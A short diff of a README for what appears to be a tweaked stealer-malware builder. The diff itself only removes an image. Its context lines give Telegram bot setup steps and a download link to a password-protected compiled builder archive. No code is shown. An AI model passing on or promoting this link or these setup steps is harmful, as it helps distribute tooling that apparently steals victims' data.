@@ -72,10 +72,6 @@ Here are some ideas i would like to implement in future or if anyone want to wor
 * Now you need to get your chat id. To do this, go to the next bot [@chatid_echo_bot](https://t.me/chatid_echo_bot) and save the id.  
 * Insert this data in builder console
 
-<p align="center">
-  <img src="Images/Builders.jpg">
-</p>
-
 ## :robot: [Download compiled builder  (Password: otaku_codes)](https://github.com/otaku-codes/StormKitty-Tweaked/releases/download/stromkitty/Stromkitty.By.otaku_codes.rar)
 
 ***
